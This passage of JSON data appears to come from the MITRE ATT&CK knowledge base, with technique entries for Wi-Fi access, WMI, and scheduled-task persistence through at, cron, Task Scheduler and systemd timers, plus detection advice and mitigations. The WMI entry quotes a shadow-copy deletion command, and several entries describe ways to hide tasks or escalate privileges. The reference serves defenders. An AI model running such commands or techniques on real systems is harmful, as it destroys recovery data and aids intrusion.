href=\"https://www.eff.org/deeplinks/2015/04/china-uses-unencrypted-websites-to-hijack-browsers-in-github-attack\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: EFF China GitHub Attack)</a>","detection":"","platforms":["Linux","macOS","Windows"],"dataSources":["Network Traffic: Network Traffic Content","Process: Process Creation","File: File Creation"],"mitigations":[{"id":"M1021","name":"Restrict Web-Based Content","description":"Consider blocking download/transfer and execution of potentially uncommon file types known to be used in adversary campaigns."},{"id":"M1041","name":"Encrypt Sensitive Information","description":"Where possible, ensure that online traffic is appropriately encrypted through services such as trusted VPNs."}],"subTechniques":[]},{"id":"T1669","name":"Wi-Fi Networks","description":"Adversaries may gain initial access to target systems by connecting to wireless networks. They may accomplish this by exploiting open Wi-Fi networks used by target devices or by accessing secured Wi-Fi networks — requiring Valid Accounts — belonging to a target organization. <a href=\"https://www.justice.gov/archives/opa/pr/us-charges-russian-gru-officers-international-hacking-and-related-influence-and\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: DOJ GRU Charges 2018)</a> <a href=\"https://www.volexity.com/blog/2024/11/22/the-nearest-neighbor-attack-how-a-russian-apt-weaponized-nearby-wi-fi-networks-for-covert-access/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Nearest Neighbor Volexity)</a> Establishing a connection to a Wi-Fi access point requires a certain level of proximity to both discover and maintain a stable network connection. \n\nAdversaries may establish a wireless connection through various methods, such as by physically positioning themselves near a Wi-Fi network to conduct close access operations. To bypass the need for physical proximity, adversaries may attempt to remotely compromise nearby third-party systems that have both wired and wireless network connections available (i.e., dual-homed systems). These third-party compromised devices can then serve as a bridge to connect to a target’s Wi-Fi network. <a href=\"https://www.volexity.com/blog/2024/11/22/the-nearest-neighbor-attack-how-a-russian-apt-weaponized-nearby-wi-fi-networks-for-covert-access/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Nearest Neighbor Volexity)</a>\n\nOnce an initial wireless connection is achieved, adversaries may leverage this access for follow-on activities in the victim network or further targeting of specific devices on the network. Adversaries may perform Network Sniffing or Adversary-in-the-Middle activities for Credential Access or Discovery.","detection":"","platforms":["Linux","Network Devices","Windows","macOS"],"dataSources":[],"mitigations":[{"id":"M1030","name":"Network Segmentation","description":"Network segmentation can be used to isolate infrastructure components that do not require broad network access. Separate networking environments for Wi-Fi and Ethernet-wired networks, particularly where Ethernet-based networks allow for access to sensitive resources."},{"id":"M1032","name":"Multi-factor Authentication","description":"Harden access requirements for Wi-Fi networks through using two or more pieces of evidence to authenticate, such as a username and password in addition to a token from a physical smart card or token generator."},{"id":"M1041","name":"Encrypt Sensitive Information","description":"Ensure that all wired and/or wireless traffic is encrypted appropriately. Use best practices for authentication protocols, such as Kerberos, and ensure that web traffic that may contain credentials is protected by SSL/TLS."}],"subTechniques":[]}]},{"tactic":"Execution","techniques":[{"id":"T1047","name":"Windows Management Instrumentation","description":"Adversaries may abuse Windows Management Instrumentation (WMI) to execute malicious commands and payloads. WMI is designed for programmers and is the infrastructure for management data and operations on Windows systems. <a href=\"https://learn.microsoft.com/en-us/windows/win32/wmisdk/wmi-start-page?redirectedfrom=MSDN\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: WMI 1-3)</a> WMI is an administration feature that provides a uniform environment to access Windows system components.\n\nThe WMI service enables both local and remote access, though the latter is facilitated by Remote Services such as Distributed Component Object Model and Windows Remote Management. <a href=\"https://learn.microsoft.com/en-us/windows/win32/wmisdk/wmi-start-page?redirectedfrom=MSDN\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: WMI 1-3)</a> Remote WMI over DCOM operates using port 135, whereas WMI over WinRM operates over port 5985 when using HTTP and 5986 for HTTPS. <a href=\"https://learn.microsoft.com/en-us/windows/win32/wmisdk/wmi-start-page?redirectedfrom=MSDN\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: WMI 1-3)</a> <a href=\"https://www.mandiant.com/resources/reports\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Mandiant WMI)</a>\n\nAn adversary can use WMI to interact with local and remote systems and use it as a means to execute various behaviors, such as gathering information for Discovery as well as Execution of commands and payloads. <a href=\"https://www.mandiant.com/resources/reports\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Mandiant WMI)</a> For example, <code>wmic.exe</code> can be abused by an adversary to delete shadow copies with the command <code>wmic.exe Shadowcopy Delete</code> (i.e., Inhibit System Recovery). <a href=\"https://www.microsoft.com/en-us/security/blog/2022/06/13/the-many-lives-of-blackcat-ransomware/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: WMI 6)</a>\n\n<strong>Note:</strong> <code>wmic.exe</code> is deprecated as of January of 2024, with the WMIC feature being “disabled by default” on Windows 11+. WMIC will be removed from subsequent Windows releases and replaced by PowerShell as the primary WMI interface. <a href=\"https://techcommunity.microsoft.com/t5/windows-it-pro-blog/wmi-command-line-wmic-utility-deprecation-next-steps/ba-p/4039242\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: WMI 7,8)</a> In addition to PowerShell and tools like <code>wbemtool.exe</code>, COM APIs can also be used to programmatically interact with WMI via C++, .NET, VBScript, etc. <a href=\"https://techcommunity.microsoft.com/t5/windows-it-pro-blog/wmi-command-line-wmic-utility-deprecation-next-steps/ba-p/4039242\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: WMI 7,8)</a>","detection":"Monitor network traffic for WMI connections; the use of WMI in environments that do not typically use WMI may be suspect. Perform process monitoring to capture command-line arguments of \"wmic\" and detect commands that are used to perform remote behavior. <a href=\"https://www.fireeye.com/content/dam/fireeye-www/global/en/current-threats/pdfs/wp-windows-management-instrumentation.pdf\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: FireEye WMI 2015)</a>","platforms":["Windows"],"dataSources":["Network Traffic: Network Connection Creation","Process: Process Creation","WMI: WMI Creation","Command: Command Execution"],"mitigations":[{"id":"M1018","name":"User Account Management","description":"By default, only administrators are allowed to connect remotely using WMI. Restrict other users who are allowed to connect, or disallow all users to connect remotely to WMI."},{"id":"M1026","name":"Privileged Account Management","description":"Prevent credential overlap across systems of administrator and privileged accounts. <a href=\"https://www.fireeye.com/content/dam/fireeye-www/global/en/current-threats/pdfs/wp-windows-management-instrumentation.pdf\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: FireEye WMI 2015)</a>"},{"id":"M1038","name":"Execution Prevention","description":"Use application control configured to block execution of <code>wmic.exe</code> if it is not required for a given system or network to prevent potential misuse by adversaries. For example, in Windows 10 and Windows Server 2016 and above, Windows Defender Application Control (WDAC) policy rules may be applied to block the <code>wmic.exe</code> application and to prevent abuse. <a href=\"https://docs.microsoft.com/windows/security/threat-protection/windows-defender-application-control/microsoft-recommended-block-rules\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Microsoft WDAC)</a>"},{"id":"M1040","name":"Behavior Prevention on Endpoint","description":"On Windows 10, enable Attack Surface Reduction (ASR) rules to block processes created by WMI commands from running. Note: many legitimate tools and applications utilize WMI for command execution. <a href=\"https://docs.microsoft.com/microsoft-365/security/defender-endpoint/attack-surface-reduction\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: win10_asr)</a>"}],"subTechniques":[]},{"id":"T1053","name":"Scheduled Task/Job","description":"Adversaries may abuse task scheduling functionality to facilitate initial or recurring execution of malicious code. Utilities exist within all major operating systems to schedule programs or scripts to be executed at a specified date and time. A task can also be scheduled on a remote system, provided the proper authentication is met (ex: RPC and file and printer sharing in Windows environments). Scheduling a task on a remote system typically may require being a member of an admin or otherwise privileged group on the remote system. <a href=\"https://technet.microsoft.com/en-us/library/cc785125.aspx\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: TechNet Task Scheduler Security)</a>\n\nAdversaries may use task scheduling to execute programs at system startup or on a scheduled basis for persistence. These mechanisms can also be abused to run a process under the context of a specified account (such as one with elevated permissions/privileges). Similar to System Binary Proxy Execution, adversaries have also abused task scheduling to potentially mask one-time execution under a trusted system process. <a href=\"https://www.proofpoint.com/us/blog/threat-insight/serpent-no-swiping-new-backdoor-targets-french-entities-unique-attack-chain\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: ProofPoint Serpent)</a>","detection":"Monitor scheduled task creation from common utilities using command-line invocation. Legitimate scheduled tasks may be created during installation of new software or through system administration functions. Look for changes to tasks that do not correlate with known software, patch cycles, etc. \n\nSuspicious program execution through scheduled tasks may show up as outlier processes that have not been seen before when compared against historical data. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as network connections made for Command and Control, learning details about the environment through Discovery, and Lateral Movement.","platforms":["Containers","ESXi","Linux","macOS","Network Devices","Windows"],"dataSources":["Scheduled Job: Scheduled Job Creation","File: File Creation","Process: Process Creation","Container: Container Creation","Command: Command Execution","File: File Modification"],"mitigations":[{"id":"M1018","name":"User Account Management","description":"Limit privileges of user accounts and remediate Privilege Escalation vectors so only authorized administrators can create scheduled tasks on remote systems."},{"id":"M1022","name":"Restrict File and Directory Permissions","description":"Restrict access by setting directory and file permissions that are not specific to users or privileged accounts."},{"id":"M1026","name":"Privileged Account Management","description":"Configure the Increase Scheduling Priority option to only allow the Administrators group the rights to schedule a priority process. This can be can be configured through GPO: Computer Configuration &gt; [Policies] &gt; Windows Settings &gt; Security Settings &gt; Local Policies &gt; User Rights Assignment: Increase scheduling priority. <a href=\"https://technet.microsoft.com/library/dn221960.aspx\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: TechNet Scheduling Priority)</a>"},{"id":"M1028","name":"Operating System Configuration","description":"Configure settings for scheduled tasks to force tasks to run under the context of the authenticated account instead of allowing them to run as SYSTEM. The associated Registry key is located at <code>HKLM\\SYSTEM\\CurrentControlSet\\Control\\Lsa\\SubmitControl</code>. The setting can be configured through GPO: Computer Configuration &gt; [Policies] &gt; Windows Settings &gt; Security Settings &gt; Local Policies &gt; Security Options: Domain Controller: Allow server operators to schedule tasks, set to disabled. <a href=\"https://technet.microsoft.com/library/jj852168.aspx\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: TechNet Server Operator Scheduled Task)</a>"},{"id":"M1047","name":"Audit","description":"Toolkits like the PowerSploit framework contain PowerUp modules that can be used to explore systems for permission weaknesses in scheduled tasks that could be used to escalate privileges. <a href=\"https://github.com/mattifestation/PowerSploit\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Powersploit)</a>"}],"subTechniques":[{"id":"T1053.002","name":"At","description":"Adversaries may abuse the at utility to perform task scheduling for initial or recurring execution of malicious code. The at utility exists as an executable within Windows, Linux, and macOS for scheduling tasks at a specified time and date. Although deprecated in favor of Scheduled Task's schtasks in Windows environments, using at requires that the Task Scheduler service be running, and the user to be logged on as a member of the local Administrators group. In addition to explicitly running the <code>at</code> command, adversaries may also schedule a task with at by directly leveraging the Windows Management Instrumentation <code>Win32_ScheduledJob</code> WMI class. <a href=\"https://www.cybereason.com/blog/wmi-lateral-movement-win32#blog-subscribe\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Malicious Life by Cybereason)</a>\n\nOn Linux and macOS, at may be invoked by the superuser as well as any users added to the <code>at.allow</code> file. If the <code>at.allow</code> file does not exist, the <code>at.deny</code> file is checked. Every username not listed in <code>at.deny</code> is allowed to invoke at. If the <code>at.deny</code> exists and is empty, global use of at is permitted. If neither file exists (which is often the baseline) only the superuser is allowed to use at. <a href=\"https://man7.org/linux/man-pages/man1/at.1p.html\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Linux at)</a>\n\nAdversaries may use at to execute programs at system startup or on a scheduled basis for Persistence. at can also be abused to conduct remote Execution as part of Lateral Movement and/or to run a process under the context of a specified account (such as SYSTEM).\n\nIn Linux environments, adversaries may also abuse at to break out of restricted environments by using a task to spawn an interactive system shell or to run system commands. Similarly, at may also be used for Privilege Escalation if the binary is allowed to run as superuser via <code>sudo</code>. <a href=\"https://gtfobins.github.io/gtfobins/at/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: GTFObins at)</a>","detection":"Monitor process execution from the svchost.exe in Windows 10 and the Windows Task Scheduler taskeng.exe for older versions of Windows. <a href=\"https://x.com/leoloobeek/status/939248813465853953\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Twitter Leoloobeek Scheduled Task)</a> If scheduled tasks are not used for persistence, then the adversary is likely to remove the task when the action is complete. Monitor Windows Task Scheduler stores in %systemroot%\\System32\\Tasks for change entries related to scheduled tasks that do not correlate with known software, patch cycles, etc.\n\nConfigure event logging for scheduled task creation and changes by enabling the \"Microsoft-Windows-TaskScheduler/Operational\" setting within the event logging service. <a href=\"https://social.technet.microsoft.com/Forums/en-US/e5bca729-52e7-4fcb-ba12-3225c564674c/scheduled-tasks-history-retention-settings?forum=winserver8gen\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: TechNet Forum Scheduled Task Operational Setting)</a> Several events will then be logged on scheduled task activity, including: <a href=\"https://technet.microsoft.com/library/dd315590.aspx\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: TechNet Scheduled Task Events)</a> <a href=\"https://docs.microsoft.com/en-us/windows/security/threat-protection/auditing/audit-other-object-access-events\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Microsoft Scheduled Task Events Win10)</a>\n\n* Event ID 106 on Windows 7, Server 2008 R2 - Scheduled task registered\n* Event ID 140 on Windows 7, Server 2008 R2 / 4702 on Windows 10, Server 2016 - Scheduled task updated\n* Event ID 141 on Windows 7, Server 2008 R2 / 4699 on Windows 10, Server 2016 - Scheduled task deleted\n* Event ID 4698 on Windows 10, Server 2016 - Scheduled task created\n* Event ID 4700 on Windows 10, Server 2016 - Scheduled task enabled\n* Event ID 4701 on Windows 10, Server 2016 - Scheduled task disabled\n\nTools such as Sysinternals Autoruns may also be used to detect system changes that could be attempts at persistence, including listing current scheduled tasks. <a href=\"https://technet.microsoft.com/en-us/sysinternals/bb963902\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: TechNet Autoruns)</a>\n\nRemote access tools with built-in features may interact directly with the Windows API to perform these functions outside of typical system utilities. Tasks may also be created through Windows system management tools such as Windows Management Instrumentation and PowerShell, so additional logging may need to be configured to gather the appropriate data.\n\nIn Linux and macOS environments, monitor scheduled task creation using command-line invocation. Legitimate scheduled tasks may be created during installation of new software or through system administration functions. Look for changes to tasks that do not correlate with known software, patch cycles, etc. \n\nReview all jobs using the <code>atq</code> command and ensure IP addresses stored in the <code>SSH_CONNECTION</code> and <code>SSH_CLIENT</code> variables, machines that created the jobs, are trusted hosts. All at jobs are stored in <code>/var/spool/cron/atjobs/</code>. <a href=\"https://www.linkedin.com/pulse/getting-attacker-ip-address-from-malicious-linux-job-craig-rowland/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: rowland linux at 2019)</a>\n\nSuspicious program execution through scheduled tasks may show up as outlier processes that have not been seen before when compared against historical data. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as network connections made for Command and Control, learning details about the environment through Discovery, and Lateral Movement.","platforms":["Windows","Linux","macOS"],"dataSources":["Command: Command Execution","Scheduled Job: Scheduled Job Creation","Network Traffic: Network Traffic Flow","Process: Process Creation","File: File Modification"],"mitigations":[{"id":"M1018","name":"User Account Management","description":"Limit privileges of user accounts and remediate Privilege Escalation vectors so only authorized administrators can create scheduled tasks on remote systems. In Linux environments, users account-level access to <code>at</code> can be managed using <code>at.allow</code> and <code>at.deny</code> files. Users listed in the at.allow are enabled to schedule actions using at, whereas users listed in at.deny file disabled from the utility."},{"id":"M1026","name":"Privileged Account Management","description":"Configure the Increase Scheduling Priority option to only allow the Administrators group the rights to schedule a priority process. This can be configured through GPO: Computer Configuration &gt; [Policies] &gt; Windows Settings &gt; Security Settings &gt; Local Policies &gt; User Rights Assignment: Increase scheduling priority. <a href=\"https://technet.microsoft.com/library/dn221960.aspx\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: TechNet Scheduling Priority)</a>"},{"id":"M1028","name":"Operating System Configuration","description":"Configure settings for scheduled tasks to force tasks to run under the context of the authenticated account instead of allowing them to run as SYSTEM. The associated Registry key is located at <code>HKLM\\SYSTEM\\CurrentControlSet\\Control\\Lsa\\SubmitControl</code>. The setting can be configured through GPO: Computer Configuration &gt; [Policies] &gt; Windows Settings &gt; Security Settings &gt; Local Policies &gt; Security Options: Domain Controller: Allow server operators to schedule tasks, set to disabled. <a href=\"https://technet.microsoft.com/library/jj852168.aspx\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: TechNet Server Operator Scheduled Task)</a>"},{"id":"M1047","name":"Audit","description":"Toolkits like the PowerSploit framework contain PowerUp modules that can be used to explore systems for permission weaknesses in scheduled tasks that could be used to escalate privileges. <a href=\"https://github.com/mattifestation/PowerSploit\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Powersploit)</a> Windows operating system also creates a registry key specifically associated with the creation of a scheduled task on the destination host at: Microsoft\\Windows NT\\CurrentVersion\\Schedule\\TaskCache\\Tree\\At1. <a href=\"https://www.secureworks.com/blog/where-you-at-indicators-of-lateral-movement-using-at-exe-on-windows-7-systems\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Secureworks - AT.exe Scheduled Task)</a> In Linux and macOS environments, scheduled tasks using <code>at</code> can be audited locally, or through centrally collected logging, using syslog, or auditd events from the host. <a href=\"https://kifarunix.com/scheduling-tasks-using-at-command-in-linux/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Kifarunix - Task Scheduling in Linux)</a>"}]},{"id":"T1053.003","name":"Cron","description":"Adversaries may abuse the <code>cron</code> utility to perform task scheduling for initial or recurring execution of malicious code. <a href=\"https://labs.sentinelone.com/20-common-tools-techniques-used-by-macos-threat-actors-malware/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: 20 macOS Common Tools and Techniques)</a> The <code>cron</code> utility is a time-based job scheduler for Unix-like operating systems.  The <code> crontab</code> file contains the schedule of cron entries to be run and the specified times for execution. Any <code>crontab</code> files are stored in operating system-specific file paths.\n\nAn adversary may use <code>cron</code> in Linux or Unix environments to execute programs at system startup or on a scheduled basis for Persistence. In ESXi environments, cron jobs must be created directly via the crontab file (e.g., <code>/var/spool/cron/crontabs/root</code>). <a href=\"https://www.cloudsek.com/blog/analysis-of-files-used-in-esxiargs-ransomware-attack-against-vmware-esxi-servers\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: CloudSEK ESXiArgs 2023)</a>","detection":"Monitor scheduled task creation from common utilities using command-line invocation. Legitimate scheduled tasks may be created during installation of new software or through system administration functions. Look for changes to tasks that do not correlate with known software, patch cycles, etc.  \n\nSuspicious program execution through scheduled tasks may show up as outlier processes that have not been seen before when compared against historical data. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as network connections made for Command and Control, learning details about the environment through Discovery, and Lateral Movement.","platforms":["Linux","macOS","ESXi"],"dataSources":["File: File Modification","Process: Process Creation","Scheduled Job: Scheduled Job Creation","Command: Command Execution"],"mitigations":[{"id":"M1018","name":"User Account Management","description":"<code>cron</code> permissions are controlled by <code>/etc/cron.allow and /etc/cron.deny</code>. If there is a <code>cron.allow</code> file, then the user or users that need to use <code>cron</code> will need to be listed in the file. <code>cron.deny</code> is used to explicitly disallow users from using cron. If neither files exist, then only the super user is allowed to run cron."},{"id":"M1047","name":"Audit","description":"Review changes to the <code>cron</code> schedule. <code>cron</code> execution can be reviewed within the <code>/var/log</code> directory. To validate the location of the <code>cron</code> log file, check the syslog config at <code>/etc/rsyslog.conf</code> or <code>/etc/syslog.conf</code>."}]},{"id":"T1053.005","name":"Scheduled Task","description":"Adversaries may abuse the Windows Task Scheduler to perform task scheduling for initial or recurring execution of malicious code. There are multiple ways to access the Task Scheduler in Windows. The schtasks utility can be run directly on the command line, or the Task Scheduler can be opened through the GUI within the Administrator Tools section of the Control Panel. <a href=\"https://stackoverflow.com/questions/2913816/how-to-find-the-location-of-the-scheduled-tasks-folder\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Stack Overflow)</a> In some cases, adversaries have used a .NET wrapper for the Windows Task Scheduler, and alternatively, adversaries have used the Windows netapi32 library and Windows Management Instrumentation (WMI) to create a scheduled task. Adversaries may also utilize the Powershell Cmdlet <code>Invoke-CimMethod</code>, which leverages WMI class <code>PS_ScheduledTask</code> to create a scheduled task via an XML path. <a href=\"https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1053.005/T1053.005.md\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Red Canary - Atomic Red Team)</a>\n\nAn adversary may use Windows Task Scheduler to execute programs at system startup or on a scheduled basis for persistence. The Windows Task Scheduler can also be abused to conduct remote Execution as part of Lateral Movement and/or to run a process under the context of a specified account (such as SYSTEM). Similar to System Binary Proxy Execution, adversaries have also abused the Windows Task Scheduler to potentially mask one-time execution under signed/trusted system processes. <a href=\"https://www.proofpoint.com/us/blog/threat-insight/serpent-no-swiping-new-backdoor-targets-french-entities-unique-attack-chain\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: ProofPoint Serpent)</a>\n\nAdversaries may also create \"hidden\" scheduled tasks (i.e. Hide Artifacts) that may not be visible to defender tools and manual queries used to enumerate tasks. Specifically, an adversary may hide a task from <code>schtasks /query</code> and the Task Scheduler by deleting the associated Security Descriptor (SD) registry value (where deletion of this value must be completed using SYSTEM permissions). <a href=\"https://github.com/SigmaHQ/sigma/blob/master/rules/windows/registry/registry_delete/registry_delete_schtasks_hide_task_via_sd_value_removal.yml\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: SigmaHQ)</a> <a href=\"https://www.microsoft.com/security/blog/2022/04/12/tarrask-malware-uses-scheduled-tasks-for-defense-evasion/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Tarrask scheduled task)</a> Adversaries may also employ alternate methods to hide tasks, such as altering the metadata (e.g., <code>Index</code> value) within associated registry keys. <a href=\"https://blog.qualys.com/vulnerabilities-threat-research/2022/06/20/defending-against-scheduled-task-attacks-in-windows-environments\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Defending Against Scheduled Task Attacks in Windows Environments)</a>","detection":"Monitor process execution from the <code>svchost.exe</code> in Windows 10 and the Windows Task Scheduler <code>taskeng.exe</code> for older versions of Windows. <a href=\"https://x.com/leoloobeek/status/939248813465853953\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Twitter Leoloobeek Scheduled Task)</a> If scheduled tasks are not used for persistence, then the adversary is likely to remove the task when the action is complete. Monitor Windows Task Scheduler stores in %systemroot%\\System32\\Tasks for change entries related to scheduled tasks that do not correlate with known software, patch cycles, etc.\n\nConfigure event logging for scheduled task creation and changes by enabling the \"Microsoft-Windows-TaskScheduler/Operational\" setting within the event logging service. <a href=\"https://social.technet.microsoft.com/Forums/en-US/e5bca729-52e7-4fcb-ba12-3225c564674c/scheduled-tasks-history-retention-settings?forum=winserver8gen\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: TechNet Forum Scheduled Task Operational Setting)</a> Several events will then be logged on scheduled task activity, including: <a href=\"https://technet.microsoft.com/library/dd315590.aspx\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: TechNet Scheduled Task Events)</a> <a href=\"https://docs.microsoft.com/en-us/windows/security/threat-protection/auditing/audit-other-object-access-events\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Microsoft Scheduled Task Events Win10)</a>\n\n* Event ID 106 on Windows 7, Server 2008 R2 - Scheduled task registered\n* Event ID 140 on Windows 7, Server 2008 R2 / 4702 on Windows 10, Server 2016 - Scheduled task updated\n* Event ID 141 on Windows 7, Server 2008 R2 / 4699 on Windows 10, Server 2016 - Scheduled task deleted\n* Event ID 4698 on Windows 10, Server 2016 - Scheduled task created\n* Event ID 4700 on Windows 10, Server 2016 - Scheduled task enabled\n* Event ID 4701 on Windows 10, Server 2016 - Scheduled task disabled\n\nTools such as Sysinternals Autoruns may also be used to detect system changes that could be attempts at persistence, including listing current scheduled tasks. <a href=\"https://technet.microsoft.com/en-us/sysinternals/bb963902\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: TechNet Autoruns)</a>\n\nRemote access tools with built-in features may interact directly with the Windows API to perform these functions outside of typical system utilities. Tasks may also be created through Windows system management tools such as Windows Management Instrumentation and PowerShell, so additional logging may need to be configured to gather the appropriate data.","platforms":["Windows"],"dataSources":["Windows Registry: Windows Registry Key Creation","File: File Modification","File: File Creation","Process: Process Creation","Command: Command Execution","Network Traffic: Network Traffic Flow","Scheduled Job: Scheduled Job Creation"],"mitigations":[{"id":"M1018","name":"User Account Management","description":"Limit privileges of user accounts and remediate Privilege Escalation vectors so only authorized administrators can create scheduled tasks on remote systems."},{"id":"M1026","name":"Privileged Account Management","description":"Configure the Increase Scheduling Priority option to only allow the Administrators group the rights to schedule a priority process. This can be configured through GPO: Computer Configuration &gt; [Policies] &gt; Windows Settings &gt; Security Settings &gt; Local Policies &gt; User Rights Assignment: Increase scheduling priority. <a href=\"https://technet.microsoft.com/library/dn221960.aspx\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: TechNet Scheduling Priority)</a>"},{"id":"M1028","name":"Operating System Configuration","description":"Configure settings for scheduled tasks to force tasks to run under the context of the authenticated account instead of allowing them to run as SYSTEM. The associated Registry key is located at HKLM\\SYSTEM\\CurrentControlSet\\Control\\Lsa\\SubmitControl. The setting can be configured through GPO: Computer Configuration &gt; [Policies] &gt; Windows Settings &gt; Security Settings &gt; Local Policies &gt; Security Options: Domain Controller: Allow server operators to schedule tasks, set to disabled. <a href=\"https://technet.microsoft.com/library/jj852168.aspx\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: TechNet Server Operator Scheduled Task)</a>"},{"id":"M1047","name":"Audit","description":"Toolkits like the PowerSploit framework contain PowerUp modules that can be used to explore systems for permission weaknesses in scheduled tasks that could be used to escalate privileges. <a href=\"https://github.com/mattifestation/PowerSploit\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Powersploit)</a>"}]},{"id":"T1053.006","name":"Systemd Timers","description":"Adversaries may abuse systemd timers to perform task scheduling for initial or recurring execution of malicious code. Systemd timers are unit files with file extension <code>.timer</code> that control services. Timers can be set to run on a calendar event or after a time span relative to a starting point. They can be used as an alternative to Cron in Linux environments. <a href=\"https://wiki.archlinux.org/index.php/Systemd/Timers\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: archlinux Systemd Timers Aug 2020)</a> Systemd timers may be activated remotely via the <code>systemctl</code> command line utility, which operates over SSH. <a href=\"https://www.tecmint.com/control-systemd-services-on-remote-linux-server/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Systemd Remote Control)</a>\n\nEach <code>.timer</code> file must have a corresponding <code>.service</code> file with the same name, e.g., <code>example.timer</code> and <code>example.service</code>. <code>.service</code> files are Systemd Service unit files that are managed by the systemd system and service manager. <a href=\"http://man7.org/linux/man-pages/man1/systemd.1.html\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Linux man-pages: systemd January 2014)</a> Privileged timers are written to <code>/etc/systemd/system/</code> and <code>/usr/lib/systemd/system</code> while user level are written to <code>~/.config/systemd/user/</code>.\n\nAn adversary may use systemd timers to execute malicious code at system startup or on a scheduled basis for persistence. <a href=\"https://www.bleepingcomputer.com/news/security/malware-found-in-arch-linux-aur-package-repository/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Arch Linux Package Systemd Compromise BleepingComputer 10JUL2018)</a> <a href=\"https://gist.github.com/campuscodi/74d0d2e35d8fd9499c76333ce027345a\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: gist Arch package compromise 10JUL2018)</a> <a href=\"https://lists.archlinux.org/pipermail/aur-general/2018-July/034153.html\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: acroread package compromised Arch Linux Mail 8JUL2018)</a> Timers installed using privileged paths may be used to maintain root level persistence. Adversaries may also install user level timers to achieve user level persistence. <a href=\"https://www.hybrid-analysis.com/sample/28553b3a9d2ad4361d33d29ac4bf771d008e0073cec01b5561c6348a608f8dd7?environmentId=300\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Falcon Sandbox smp: 28553b3a9d)</a>","detection":"Systemd timer unit files may be detected by auditing file creation and modification events within the <code>/etc/systemd/system</code>, <code>/usr/lib/systemd/system/</code>, and <code>~/.config/systemd/user/</code> directories, as well as associated symbolic links. Suspicious processes or scripts spawned in this manner will have a parent process of ‘systemd’, a parent process ID of 1, and will usually execute as the ‘root’ user.\n\nSuspicious systemd timers can also be identified by comparing results against a trusted system baseline. Malicious systemd timers may be detected by using the systemctl utility to examine system wide timers: <code>systemctl list-timers –all</code>. Analyze the contents of corresponding <code>.service</code> files present on the file system and ensure that they refer to legitimate, expected executables.\n\nAudit the execution and command-line arguments of the 'systemd-run' utility as it may be used to create timers. <a href=\"https://wiki.archlinux.org/index.php/Systemd/Timers\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: archlinux Systemd Timers Aug 2020)</a>","platforms":["Linux"],"dataSources":["File: File Modification","Process: Process Creation","Command: Command Execution","Scheduled Job: Scheduled Job Creation"],"mitigations":[{"id":"M1018","name":"User Account Management","description":"Limit user access to system utilities such as 'systemctl' or 'systemd-run' to users who have a legitimate need."},{"id":"M1022","name":"Restrict File and Directory Permissions","description":"Restrict read/write access to systemd <code>.timer</code> unit files to only select privileged users who have a legitimate need to manage system services."},{"id":"M1026","name":"Privileged Account Management","description":"Limit access to the root 